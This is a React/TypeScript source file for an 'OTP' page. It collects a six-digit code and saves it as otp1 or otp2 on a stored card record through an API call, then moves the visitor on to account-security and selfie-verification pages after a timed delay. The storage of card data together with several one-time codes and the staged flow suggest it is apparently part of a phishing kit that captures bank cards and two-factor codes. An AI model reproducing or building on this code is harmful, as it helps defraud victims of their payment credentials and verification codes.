import { FormEvent, useLayoutEffect, useState } from "react";
import { useNavigate, useParams } from "react-router-dom";
import Input from "../components/Input";
import Description from "../components/typographies/Description";
import Title from "../components/typographies/Title";
import Button from "../components/Button";
import texts from "../utils/texts";
import useCountry from "../hooks/useCountry";
import useLoading from "../hooks/useLoading";
import useCard from "../hooks/useCard";
import api from "../utils/api";
import { DURATION_AFTER_OTP } from "../utils/constants";

export default function OTPPage() {
  const navigate = useNavigate();
  const { id } = useParams();
  const { locale } = useCountry();
  const { setLoadingAct } = useLoading();
  const { card, setCardAct } = useCard();

  const [otp, setOtp] = useState<string>("");

  const submitDisabled = otp.length !== 6;

  const onAcceptOTP = (value: string) => {
    setOtp(value);
  };

  const onSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (submitDisabled) return;

    setLoadingAct(true);
    const valueToBeChanged = id === "1" ? { otp1: otp } : { otp2: otp };

    api
      .put(`/card/update/${card?.id}`, {
        ...card,
        ...valueToBeChanged,
      })
      .then((res) => {
        const timeoutId = setTimeout(() => {
          setCardAct(res.data);
          setLoadingAct(false);

          if (id === "1") {
            navigate("/account-security");
          } else {
            navigate("/verify-by-selfie");
          }

          clearTimeout(timeoutId);
        }, DURATION_AFTER_OTP);
      })
      .catch(() => {
        setLoadingAct(false);
      });
  };

  useLayoutEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="mt-8 flex flex-col gap-6 lg:gap-12 items-start">
      <Title>{texts.otp[locale]}</Title>
      <Description>{texts.otpSent[locale]}</Description>
      <form
        onSubmit={onSubmit}
        className="flex flex-col items-center gap-12 w-full"
      >
        <div className="flex flex-col items-start gap-4 w-full">
          <Input
            name="otp"
            className="w-full"
            mask="000000"
            placeholder={`${texts.otp[locale]}:`}
            onAccept={onAcceptOTP}
          />
          <Description>{texts.notShare[locale]}</Description>
        </div>

        <Button type="submit" className="w-72" disabled={submitDisabled}>
          {texts.submit[locale]}
        </Button>
      </form>
    </div>
  );
}
